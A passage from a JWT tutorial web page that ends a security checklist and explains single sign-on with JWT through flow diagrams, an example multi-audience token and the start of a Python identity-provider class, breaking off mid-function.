<a id="__codelineno-42-23" name="__codelineno-42-23" href="#__codelineno-42-23"></a>   Check token blacklist (if using)
<a id="__codelineno-42-24" name="__codelineno-42-24" href="#__codelineno-42-24"></a>
<a id="__codelineno-42-25" name="__codelineno-42-25" href="#__codelineno-42-25"></a>Secret Management:
<a id="__codelineno-42-26" name="__codelineno-42-26" href="#__codelineno-42-26"></a>   Use environment variables
<a id="__codelineno-42-27" name="__codelineno-42-27" href="#__codelineno-42-27"></a>   Rotate secrets regularly
<a id="__codelineno-42-28" name="__codelineno-42-28" href="#__codelineno-42-28"></a>   Use strong, random secrets (32+ bytes)
<a id="__codelineno-42-29" name="__codelineno-42-29" href="#__codelineno-42-29"></a>   Never commit secrets to version control
<a id="__codelineno-42-30" name="__codelineno-42-30" href="#__codelineno-42-30"></a>   Use different secrets for dev/staging/prod
<a id="__codelineno-42-31" name="__codelineno-42-31" href="#__codelineno-42-31"></a>
<a id="__codelineno-42-32" name="__codelineno-42-32" href="#__codelineno-42-32"></a>Content:
<a id="__codelineno-42-33" name="__codelineno-42-33" href="#__codelineno-42-33"></a>   Never store passwords in JWT
<a id="__codelineno-42-34" name="__codelineno-42-34" href="#__codelineno-42-34"></a>   Never store sensitive PII
<a id="__codelineno-42-35" name="__codelineno-42-35" href="#__codelineno-42-35"></a>   Never store credit card data
<a id="__codelineno-42-36" name="__codelineno-42-36" href="#__codelineno-42-36"></a>   Only store minimal, non-sensitive data
<a id="__codelineno-42-37" name="__codelineno-42-37" href="#__codelineno-42-37"></a>
<a id="__codelineno-42-38" name="__codelineno-42-38" href="#__codelineno-42-38"></a>Transport:
<a id="__codelineno-42-39" name="__codelineno-42-39" href="#__codelineno-42-39"></a>   Always use HTTPS
<a id="__codelineno-42-40" name="__codelineno-42-40" href="#__codelineno-42-40"></a>   Use Authorization header (not URL)
<a id="__codelineno-42-41" name="__codelineno-42-41" href="#__codelineno-42-41"></a>   Implement rate limiting
<a id="__codelineno-42-42" name="__codelineno-42-42" href="#__codelineno-42-42"></a>   Log suspicious activity
</code></pre></div>
<hr />
<h2 id="jwt-in-single-sign-on-sso">JWT in Single Sign-On (SSO)</h2>
<h3 id="what-is-sso-with-jwt">What is SSO with JWT?</h3>
<p><strong>Single Sign-On (SSO)</strong> allows users to authenticate once and access multiple applications without re-entering credentials. JWT is commonly used as the token format in SSO systems.</p>
<h3 id="sso-architecture-with-jwt">SSO Architecture with JWT</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>
<a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a>                    SSO Flow with JWT                            
<a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a>
<a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a>                                                                  
<a id="__codelineno-43-5" name="__codelineno-43-5" href="#__codelineno-43-5"></a>                         Identity Provider (IdP)                  
<a id="__codelineno-43-6" name="__codelineno-43-6" href="#__codelineno-43-6"></a>                      (Auth0, Okta, Keycloak)                    
<a id="__codelineno-43-7" name="__codelineno-43-7" href="#__codelineno-43-7"></a>                                             
<a id="__codelineno-43-8" name="__codelineno-43-8" href="#__codelineno-43-8"></a>                        Authentication                         
<a id="__codelineno-43-9" name="__codelineno-43-9" href="#__codelineno-43-9"></a>                           Server                              
<a id="__codelineno-43-10" name="__codelineno-43-10" href="#__codelineno-43-10"></a>                                             
<a id="__codelineno-43-11" name="__codelineno-43-11" href="#__codelineno-43-11"></a>                                                                 
<a id="__codelineno-43-12" name="__codelineno-43-12" href="#__codelineno-43-12"></a>                                Issues JWT                       
<a id="__codelineno-43-13" name="__codelineno-43-13" href="#__codelineno-43-13"></a>                                                                 
<a id="__codelineno-43-14" name="__codelineno-43-14" href="#__codelineno-43-14"></a>                    
<a id="__codelineno-43-15" name="__codelineno-43-15" href="#__codelineno-43-15"></a>                                                              
<a id="__codelineno-43-16" name="__codelineno-43-16" href="#__codelineno-43-16"></a>                                                              
<a id="__codelineno-43-17" name="__codelineno-43-17" href="#__codelineno-43-17"></a>                     
<a id="__codelineno-43-18" name="__codelineno-43-18" href="#__codelineno-43-18"></a>     App 1               App 2              App 3        
<a id="__codelineno-43-19" name="__codelineno-43-19" href="#__codelineno-43-19"></a>    (Gmail)             (Drive)           (Calendar)     
<a id="__codelineno-43-20" name="__codelineno-43-20" href="#__codelineno-43-20"></a>                     
<a id="__codelineno-43-21" name="__codelineno-43-21" href="#__codelineno-43-21"></a>                                                                  
<a id="__codelineno-43-22" name="__codelineno-43-22" href="#__codelineno-43-22"></a>  User logs in ONCE  Gets JWT  Accesses ALL apps              
<a id="__codelineno-43-23" name="__codelineno-43-23" href="#__codelineno-43-23"></a>                                                                  
<a id="__codelineno-43-24" name="__codelineno-43-24" href="#__codelineno-43-24"></a>
</code></pre></div>
<h3 id="complete-sso-flow-step-by-step">Complete SSO Flow (Step-by-Step)</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>                           
<a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a>  User               App 1                 IdP                App 2   
<a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a> (Browser)          (Gmail)            (Auth0)               (Drive)  
<a id="__codelineno-44-4" name="__codelineno-44-4" href="#__codelineno-44-4"></a>                           
<a id="__codelineno-44-5" name="__codelineno-44-5" href="#__codelineno-44-5"></a>                                                                     
<a id="__codelineno-44-6" name="__codelineno-44-6" href="#__codelineno-44-6"></a>       1. Visit App 1                                                
<a id="__codelineno-44-7" name="__codelineno-44-7" href="#__codelineno-44-7"></a>     &gt;                                            
<a id="__codelineno-44-8" name="__codelineno-44-8" href="#__codelineno-44-8"></a>                                                                     
<a id="__codelineno-44-9" name="__codelineno-44-9" href="#__codelineno-44-9"></a>       2. Not authenticated, redirect to IdP                          
<a id="__codelineno-44-10" name="__codelineno-44-10" href="#__codelineno-44-10"></a>     &lt;                                            
<a id="__codelineno-44-11" name="__codelineno-44-11" href="#__codelineno-44-11"></a>                                                                     
<a id="__codelineno-44-12" name="__codelineno-44-12" href="#__codelineno-44-12"></a>       3. Redirected to IdP login page                                
<a id="__codelineno-44-13" name="__codelineno-44-13" href="#__codelineno-44-13"></a>     &gt;                     
<a id="__codelineno-44-14" name="__codelineno-44-14" href="#__codelineno-44-14"></a>                                                                     
<a id="__codelineno-44-15" name="__codelineno-44-15" href="#__codelineno-44-15"></a>       4. Enter credentials (username/password)                       
<a id="__codelineno-44-16" name="__codelineno-44-16" href="#__codelineno-44-16"></a>     &gt;                     
<a id="__codelineno-44-17" name="__codelineno-44-17" href="#__codelineno-44-17"></a>                                                                     
<a id="__codelineno-44-18" name="__codelineno-44-18" href="#__codelineno-44-18"></a>                                 5. Validate credentials             
<a id="__codelineno-44-19" name="__codelineno-44-19" href="#__codelineno-44-19"></a>                                     User authenticated            
<a id="__codelineno-44-20" name="__codelineno-44-20" href="#__codelineno-44-20"></a>                                                                     
<a id="__codelineno-44-21" name="__codelineno-44-21" href="#__codelineno-44-21"></a>                                 6. Create JWT                       
<a id="__codelineno-44-22" name="__codelineno-44-22" href="#__codelineno-44-22"></a>                                                 
<a id="__codelineno-44-23" name="__codelineno-44-23" href="#__codelineno-44-23"></a>                                     Header:                       
<a id="__codelineno-44-24" name="__codelineno-44-24" href="#__codelineno-44-24"></a>                                     {&quot;alg&quot;:&quot;RS256&quot;}               
<a id="__codelineno-44-25" name="__codelineno-44-25" href="#__codelineno-44-25"></a>                                                 
<a id="__codelineno-44-26" name="__codelineno-44-26" href="#__codelineno-44-26"></a>                                     Payload:                      
<a id="__codelineno-44-27" name="__codelineno-44-27" href="#__codelineno-44-27"></a>                                     {sub: &quot;user123&quot;}              
<a id="__codelineno-44-28" name="__codelineno-44-28" href="#__codelineno-44-28"></a>                                     {iss: &quot;auth0&quot;}                
<a id="__codelineno-44-29" name="__codelineno-44-29" href="#__codelineno-44-29"></a>                                     {aud: [&quot;app1&quot;,                
<a id="__codelineno-44-30" name="__codelineno-44-30" href="#__codelineno-44-30"></a>                                           &quot;app2&quot;,                 
<a id="__codelineno-44-31" name="__codelineno-44-31" href="#__codelineno-44-31"></a>                                           &quot;app3&quot;]}                
<a id="__codelineno-44-32" name="__codelineno-44-32" href="#__codelineno-44-32"></a>                                     {exp: ...}                    
<a id="__codelineno-44-33" name="__codelineno-44-33" href="#__codelineno-44-33"></a>                                                 
<a id="__codelineno-44-34" name="__codelineno-44-34" href="#__codelineno-44-34"></a>                                                                     
<a id="__codelineno-44-35" name="__codelineno-44-35" href="#__codelineno-44-35"></a>       7. Redirect back to App 1 with JWT                            
<a id="__codelineno-44-36" name="__codelineno-44-36" href="#__codelineno-44-36"></a>     &lt;                     
<a id="__codelineno-44-37" name="__codelineno-44-37" href="#__codelineno-44-37"></a>       https://gmail.com/callback?token=eyJhbG...                     
<a id="__codelineno-44-38" name="__codelineno-44-38" href="#__codelineno-44-38"></a>                                                                     
<a id="__codelineno-44-39" name="__codelineno-44-39" href="#__codelineno-44-39"></a>       8. Extract JWT                                                
<a id="__codelineno-44-40" name="__codelineno-44-40" href="#__codelineno-44-40"></a>     &gt;                                            
<a id="__codelineno-44-41" name="__codelineno-44-41" href="#__codelineno-44-41"></a>                                                                     
<a id="__codelineno-44-42" name="__codelineno-44-42" href="#__codelineno-44-42"></a>                           9. Verify JWT with IdP&#39;s public key       
<a id="__codelineno-44-43" name="__codelineno-44-43" href="#__codelineno-44-43"></a>                              (Fetch JWKS from IdP)                  
<a id="__codelineno-44-44" name="__codelineno-44-44" href="#__codelineno-44-44"></a>                                                                     
<a id="__codelineno-44-45" name="__codelineno-44-45" href="#__codelineno-44-45"></a>       10. Set session cookie, access granted                         
<a id="__codelineno-44-46" name="__codelineno-44-46" href="#__codelineno-44-46"></a>     &lt;                                            
<a id="__codelineno-44-47" name="__codelineno-44-47" href="#__codelineno-44-47"></a>                                                                     
<a id="__codelineno-44-48" name="__codelineno-44-48" href="#__codelineno-44-48"></a>        Using App 1                                                
<a id="__codelineno-44-49" name="__codelineno-44-49" href="#__codelineno-44-49"></a>                                                                     
<a id="__codelineno-44-50" name="__codelineno-44-50" href="#__codelineno-44-50"></a>                                                                       
<a id="__codelineno-44-51" name="__codelineno-44-51" href="#__codelineno-44-51"></a>       11. Visit App 2 (same session, has JWT in cookie)              
<a id="__codelineno-44-52" name="__codelineno-44-52" href="#__codelineno-44-52"></a>     &gt;
<a id="__codelineno-44-53" name="__codelineno-44-53" href="#__codelineno-44-53"></a>                                                                     
<a id="__codelineno-44-54" name="__codelineno-44-54" href="#__codelineno-44-54"></a>                                                  12. JWT already present
<a id="__codelineno-44-55" name="__codelineno-44-55" href="#__codelineno-44-55"></a>                                                      Verify signature
<a id="__codelineno-44-56" name="__codelineno-44-56" href="#__codelineno-44-56"></a>                                                      Check &#39;aud&#39; includes &quot;app2&quot;
<a id="__codelineno-44-57" name="__codelineno-44-57" href="#__codelineno-44-57"></a>                                                       Valid      
<a id="__codelineno-44-58" name="__codelineno-44-58" href="#__codelineno-44-58"></a>                                                                     
<a id="__codelineno-44-59" name="__codelineno-44-59" href="#__codelineno-44-59"></a>       13. Access granted (NO re-authentication!)                     
<a id="__codelineno-44-60" name="__codelineno-44-60" href="#__codelineno-44-60"></a>     &lt;
<a id="__codelineno-44-61" name="__codelineno-44-61" href="#__codelineno-44-61"></a>                                                                     
<a id="__codelineno-44-62" name="__codelineno-44-62" href="#__codelineno-44-62"></a>        Using App 2                                                
<a id="__codelineno-44-63" name="__codelineno-44-63" href="#__codelineno-44-63"></a>                                                                     
<a id="__codelineno-44-64" name="__codelineno-44-64" href="#__codelineno-44-64"></a>     
<a id="__codelineno-44-65" name="__codelineno-44-65" href="#__codelineno-44-65"></a>
<a id="__codelineno-44-66" name="__codelineno-44-66" href="#__codelineno-44-66"></a>     User authenticated ONCE, accessed TWO apps without re-login!
</code></pre></div>
<h3 id="jwt-structure-in-sso">JWT Structure in SSO</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a><span class="p">{</span>
<a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a><span class="w">  </span><span class="c1">// Header</span>
<a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a><span class="w">  </span><span class="nt">&quot;alg&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;RS256&quot;</span><span class="p">,</span>
<a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a><span class="w">  </span><span class="nt">&quot;typ&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;JWT&quot;</span><span class="p">,</span>
<a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a><span class="w">  </span><span class="nt">&quot;kid&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;auth0-key-2024&quot;</span>
<a id="__codelineno-45-6" name="__codelineno-45-6" href="#__codelineno-45-6"></a><span class="p">}</span>
<a id="__codelineno-45-7" name="__codelineno-45-7" href="#__codelineno-45-7"></a><span class="p">{</span>
<a id="__codelineno-45-8" name="__codelineno-45-8" href="#__codelineno-45-8"></a><span class="w">  </span><span class="c1">// Payload</span>
<a id="__codelineno-45-9" name="__codelineno-45-9" href="#__codelineno-45-9"></a><span class="w">  </span><span class="nt">&quot;iss&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://auth.example.com&quot;</span><span class="p">,</span><span class="w">           </span><span class="c1">// Identity Provider</span>
<a id="__codelineno-45-10" name="__codelineno-45-10" href="#__codelineno-45-10"></a><span class="w">  </span><span class="nt">&quot;sub&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;user_12345&quot;</span><span class="p">,</span><span class="w">                          </span><span class="c1">// User ID</span>
<a id="__codelineno-45-11" name="__codelineno-45-11" href="#__codelineno-45-11"></a><span class="w">  </span><span class="nt">&quot;aud&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">                                      </span><span class="c1">// Multiple audiences</span>
<a id="__codelineno-45-12" name="__codelineno-45-12" href="#__codelineno-45-12"></a><span class="w">    </span><span class="s2">&quot;https://gmail.example.com&quot;</span><span class="p">,</span>
<a id="__codelineno-45-13" name="__codelineno-45-13" href="#__codelineno-45-13"></a><span class="w">    </span><span class="s2">&quot;https://drive.example.com&quot;</span><span class="p">,</span>
<a id="__codelineno-45-14" name="__codelineno-45-14" href="#__codelineno-45-14"></a><span class="w">    </span><span class="s2">&quot;https://calendar.example.com&quot;</span>
<a id="__codelineno-45-15" name="__codelineno-45-15" href="#__codelineno-45-15"></a><span class="w">  </span><span class="p">],</span>
<a id="__codelineno-45-16" name="__codelineno-45-16" href="#__codelineno-45-16"></a><span class="w">  </span><span class="nt">&quot;exp&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1735689600</span><span class="p">,</span><span class="w">                            </span><span class="c1">// Expiration</span>
<a id="__codelineno-45-17" name="__codelineno-45-17" href="#__codelineno-45-17"></a><span class="w">  </span><span class="nt">&quot;iat&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1735603200</span><span class="p">,</span><span class="w">                            </span><span class="c1">// Issued at</span>
<a id="__codelineno-45-18" name="__codelineno-45-18" href="#__codelineno-45-18"></a><span class="w">  </span><span class="nt">&quot;email&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;user@example.com&quot;</span><span class="p">,</span>
<a id="__codelineno-45-19" name="__codelineno-45-19" href="#__codelineno-45-19"></a><span class="w">  </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;John Doe&quot;</span><span class="p">,</span>
<a id="__codelineno-45-20" name="__codelineno-45-20" href="#__codelineno-45-20"></a><span class="w">  </span><span class="nt">&quot;roles&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;user&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;editor&quot;</span><span class="p">],</span>
<a id="__codelineno-45-21" name="__codelineno-45-21" href="#__codelineno-45-21"></a>
<a id="__codelineno-45-22" name="__codelineno-45-22" href="#__codelineno-45-22"></a><span class="w">  </span><span class="c1">// SSO-specific claims</span>
<a id="__codelineno-45-23" name="__codelineno-45-23" href="#__codelineno-45-23"></a><span class="w">  </span><span class="nt">&quot;session_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;sess_abc123&quot;</span><span class="p">,</span><span class="w">                  </span><span class="c1">// SSO session ID</span>
<a id="__codelineno-45-24" name="__codelineno-45-24" href="#__codelineno-45-24"></a><span class="w">  </span><span class="nt">&quot;auth_time&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1735603200</span><span class="p">,</span><span class="w">                      </span><span class="c1">// When user authenticated</span>
<a id="__codelineno-45-25" name="__codelineno-45-25" href="#__codelineno-45-25"></a><span class="w">  </span><span class="nt">&quot;amr&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;pwd&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;mfa&quot;</span><span class="p">],</span><span class="w">                        </span><span class="c1">// Auth methods: password + MFA</span>
<a id="__codelineno-45-26" name="__codelineno-45-26" href="#__codelineno-45-26"></a><span class="w">  </span><span class="nt">&quot;acr&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;urn:mace:incommon:iap:silver&quot;</span><span class="w">        </span><span class="c1">// Auth context class</span>
<a id="__codelineno-45-27" name="__codelineno-45-27" href="#__codelineno-45-27"></a><span class="p">}</span>
</code></pre></div>
<h3 id="sso-implementation-example">SSO Implementation Example</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a><span class="c1"># Identity Provider (IdP)</span>
<a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a><span class="k">class</span><span class="w"> </span><span class="nc">SSOIdentityProvider</span><span class="p">:</span>
<a id="__codelineno-46-3" name="__codelineno-46-3" href="#__codelineno-46-3"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;SSO Identity Provider - Issues JWTs for multiple apps&quot;&quot;&quot;</span>
<a id="__codelineno-46-4" name="__codelineno-46-4" href="#__codelineno-46-4"></a>
<a id="__codelineno-46-5" name="__codelineno-46-5" href="#__codelineno-46-5"></a>    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">private_key</span><span class="p">,</span> <span class="n">issuer_url</span><span class="p">):</span>
<a id="__codelineno-46-6" name="__codelineno-46-6" href="#__codelineno-46-6"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">private_key</span> <span class="o">=</span> <span class="n">private_key</span>
<a id="__codelineno-46-7" name="__codelineno-46-7" href="#__codelineno-46-7"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">issuer_url</span> <span class="o">=</span> <span class="n">issuer_url</span>
<a id="__codelineno-46-8" name="__codelineno-46-8" href="#__codelineno-46-8"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">registered_apps</span> <span class="o">=</span> <span class="p">{</span>
<a id="__codelineno-46-9" name="__codelineno-46-9" href="#__codelineno-46-9"></a>            <span class="s1">&#39;app1&#39;</span><span class="p">:</span> <span class="p">{</span>
<a id="__codelineno-46-10" name="__codelineno-46-10" href="#__codelineno-46-10"></a>                <span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="s1">&#39;Gmail&#39;</span><span class="p">,</span>
<a id="__codelineno-46-11" name="__codelineno-46-11" href="#__codelineno-46-11"></a>                <span class="s1">&#39;audience&#39;</span><span class="p">:</span> <span class="s1">&#39;https://gmail.example.com&#39;</span><span class="p">,</span>
<a id="__codelineno-46-12" name="__codelineno-46-12" href="#__codelineno-46-12"></a>                <span class="s1">&#39;redirect_uri&#39;</span><span class="p">:</span> <span class="s1">&#39;https://gmail.example.com/callback&#39;</span>
<a id="__codelineno-46-13" name="__codelineno-46-13" href="#__codelineno-46-13"></a>            <span class="p">},</span>
<a id="__codelineno-46-14" name="__codelineno-46-14" href="#__codelineno-46-14"></a>            <span class="s1">&#39;app2&#39;</span><span class="p">:</span> <span class="p">{</span>
<a id="__codelineno-46-15" name="__codelineno-46-15" href="#__codelineno-46-15"></a>                <span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="s1">&#39;Drive&#39;</span><span class="p">,</span>
<a id="__codelineno-46-16" name="__codelineno-46-16" href="#__codelineno-46-16"></a>                <span class="s1">&#39;audience&#39;</span><span class="p">:</span> <span class="s1">&#39;https://drive.example.com&#39;</span><span class="p">,</span>
<a id="__codelineno-46-17" name="__codelineno-46-17" href="#__codelineno-46-17"></a>                <span class="s1">&#39;redirect_uri&#39;</span><span class="p">:</span> <span class="s1">&#39;https://drive.example.com/callback&#39;</span>
<a id="__codelineno-46-18" name="__codelineno-46-18" href="#__codelineno-46-18"></a>            <span class="p">},</span>
<a id="__codelineno-46-19" name="__codelineno-46-19" href="#__codelineno-46-19"></a>            <span class="s1">&#39;app3&#39;</span><span class="p">:</span> <span class="p">{</span>
<a id="__codelineno-46-20" name="__codelineno-46-20" href="#__codelineno-46-20"></a>                <span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="s1">&#39;Calendar&#39;</span><span class="p">,</span>
<a id="__codelineno-46-21" name="__codelineno-46-21" href="#__codelineno-46-21"></a>                <span class="s1">&#39;audience&#39;</span><span class="p">:</span> <span class="s1">&#39;https://calendar.example.com&#39;</span><span class="p">,</span>
<a id="__codelineno-46-22" name="__codelineno-46-22" href="#__codelineno-46-22"></a>                <span class="s1">&#39;redirect_uri&#39;</span><span class="p">:</span> <span class="s1">&#39;https://calendar.example.com/callback&#39;</span>
<a id="__codelineno-46-23" name="__codelineno-46-23" href="#__codelineno-46-23"></a>            <span class="p">}</span>
<a id="__codelineno-46-24" name="__codelineno-46-24" href="#__codelineno-46-24"></a>        <span class="p">}</span>
<a id="__codelineno-46-25" name="__codelineno-46-25" href="#__codelineno-46-25"></a>
<a id="__codelineno-46-26" name="__codelineno-46-26" href="#__codelineno-46-26"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">authenticate_user</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
<a id="__codelineno-46-27" name="__codelineno-46-27" href="#__codelineno-46-27"></a><span class="w">        </span><span class="sd">&quot;&quot;&quot;Authenticate user and create SSO session&quot;&quot;&quot;</span>
<a id="__codelineno-46-28" name="__codelineno-46-28" href="#__codelineno-46-28"></a>        <span class="c1"># Verify credentials (check database)</span>
<a id="__codelineno-46-29" name="__codelineno-46-29" href="#__codelineno-46-29"></a>        <span class="n">user</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">verify_credentials</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
<a id="__codelineno-46-30" name="__codelineno-46-30" href="#__codelineno-46-30"></a>        <span class="k">if</span> <span class="ow">not</span> <span class="n">user</span><span class="p">:</span>
<a id="__codelineno-46-31" name="__codelineno-46-31" href="#__codelineno-46-31"></a>            <span class="k">return</span> <span class="p">{</span><span class="s1">&#39;success&#39;</span><span class="p">:</span> <span class="kc">False</span><span class="p">,</span> <span class="s1">&#39;error&#39;</span><span class="p">:</span> <span class="s1">&#39;Invalid credentials&#39;</span><span class="p">}</span>
<a id="__codelineno-46-32" name="__codelineno-46-32" href="#__codelineno-46-32"></a>
<a id="__codelineno-46-33" name="__codelineno-46-33" href="#__codelineno-46-33"></a>        <span class="c1"># Create SSO session</span>
<a id="__codelineno-46-34" name="__codelineno-46-34" href="#__codelineno-46-34"></a>        <span class="n">session_id</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">create_sso_session</span><span class="p">(</span><span class="n">user</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">])</span>
<a id="__codelineno-46-35" name="__codelineno-46-35" href="#__codelineno-46-35"></a>
<a id="__codelineno-46-36" name="__codelineno-46-36" href="#__codelineno-46-36"></a>        <span class="c1"># Create JWT with multiple audiences</span>
<a id="__codelineno-46-37" name="__codelineno-46-37" href="#__codelineno-46-37"></a>        <span class="n">jwt_token</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">create_sso_token</span><span class="p">(</span>
<a id="__codelineno-46-38" name="__codelineno-46-38" href="#__codelineno-46-38"></a>            <span class="n">user_id</span><span class="o">=</span><span class="n">user</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">],</span>
<a id="__codelineno-46-39" name="__codelineno-46-39" href="#__codelineno-46-39"></a>            <span class="n">email</span><span class="o">=</span><span class="n">user</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">],</span>
<a id="__codelineno-46-40" name="__codelineno-46-40" href="#__codelineno-46-40"></a>            <span class="n">name</span><span class="o">=</span><span class="n">user</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">],</span>
<a id="__codelineno-46-41" name="__codelineno-46-41" href="#__codelineno-46-41"></a>            <span class="n">roles</span><span class="o">=</span><span class="n">user</span><span class="p">[</span><span class="s1">&#39;roles&#39;</span><span class="p">],</span>
<a id="__codelineno-46-42" name="__codelineno-46-42" href="#__codelineno-46-42"></a>            <span class="n">session_id</span><span class="o">=</span><span class="n">session_id</span><span class="p">,</span>
<a id="__codelineno-46-43" name="__codelineno-46-43" href="#__codelineno-46-43"></a>            <span class="n">audiences</span><span class="o">=</span><span class="p">[</span><span class="n">app</span><span class="p">[</span><span class="s1">&#39;audience&#39;</span><span class="p">]</span> <span class="k">for</span> <span class="n">app</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">registered_apps</span><span class="o">.</span><span class="n">values</span><span class="p">()]</span>
<a id="__codelineno-46-44" name="__codelineno-46-44" href="#__codelineno-46-44"></a>        <span class="p">)</span>
<a id="__codelineno-46-45" name="__codelineno-46-45" href="#__codelineno-46-45"></a>
<a id="__codelineno-46-46" name="__codelineno-46-46" href="#__codelineno-46-46"></a>        <span class="k">return</span> <span class="p">{</span>
<a id="__codelineno-46-47" name="__codelineno-46-47" href="#__codelineno-46-47"></a>            <span class="s1">&#39;success&#39;</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span>
<a id="__codelineno-46-48" name="__codelineno-46-48" href="#__codelineno-46-48"></a>            <span class="s1">&#39;token&#39;</span><span class="p">:</span> <span class="n">jwt_token</span><span class="p">,</span>
<a id="__codelineno-46-49" name="__codelineno-46-49" href="#__codelineno-46-49"></a>            <span class="s1">&#39;session_id&#39;</span><span class="p">:</span> <span class="n">session_id</span><span class="p">,</span>
<a id="__codelineno-46-50" name="__codelineno-46-50" href="#__codelineno-46-50"></a>            <span class="s1">&#39;user&#39;</span><span class="p">:</span> <span class="n">user</span>
<a id="__codelineno-46-51" name="__codelineno-46-51" href="#__codelineno-46-51"></a>        <span class="p">}</span>
<a id="__codelineno-46-52" name="__codelineno-46-52" href="#__codelineno-46-52"></a>
<a id="__codelineno-46-53" name="__codelineno-46-53" href="#__codelineno-46-53"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">create_sso_token</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">user_id</span><span class="p">,</span> <span class="n">email</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">roles</span><span class="p">,</span> <span class="n">session_id</span><span class="p">,</span> <span class="n">audiences</span><span class="p">):</span>
<a id="__codelineno-46-54" name="__codelineno-46-54" href="#__codelineno-46-54"></a><span class="w">        </span><span class="sd">&quot;&quot;&quot;Create JWT for SSO with multiple audiences&quot;&quot;&quot;</span>
<a id="__codelineno-46-55" name="__codelineno-46-55" href="#__codelineno-46-55"></a>        <span class="n">now</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">utcnow</span><span class="p">()</span>
<a id="__codelineno-46-56" name="__codelineno-46-56" href="#__codelineno-46-56"></a>
<a id="__codelineno-46-57" name="__codelineno-46-57" href="#__codelineno-46-57"></a>        <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
<a id="__codelineno-46-58" name="__codelineno-46-58" href="#__codelineno-46-58"></a>            <span class="c1"># Standard claims</span>
<a id="__codelineno-46-59" name="__codelineno-46-59" href="#__codelineno-46-59"></a>            <span class="s1">&#39;iss&#39;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">issuer_url</span><span class="p">,</span>
<a id="__codelineno-46-60" name="__codelineno-46-60" href="#__codelineno-46-60"></a>            <span class="s1">&#39;sub&#39;</span><span class="p">:</span> <span class="n">user_id</span><span class="p">,</span>
<a id="__codelineno-46-61" name="__codelineno-46-61" href="#__codelineno-46-61"></a>            <span class="s1">&#39;aud&#39;</span><span class="p">:</span> <span class="n">audiences</span><span class="p">,</span>  <span class="c1"># Multiple apps can use this token</span>
<a id="__codelineno-46-62" name="__codelineno-46-62" href="#__codelineno-46-62"></a>            <span class="s1">&#39;exp&#39;</span><span class="p">:</span> <span class="n">now</span> <span class="o">+</span> <span class="n">timedelta</span><span class="p">(</span><span class="n">hours</span><span class="o">=</span><span class="mi">8</span><span class="p">),</span>  <span class="c1"># 8 hour SSO session</span>
<a id="__codelineno-46-63" name="__codelineno-46-63" href="#__codelineno-46-63"></a>            <span class="s1">&#39;iat&#39;</span><span class="p">:</span> <span class="n">now</span><span class="p">,</span>
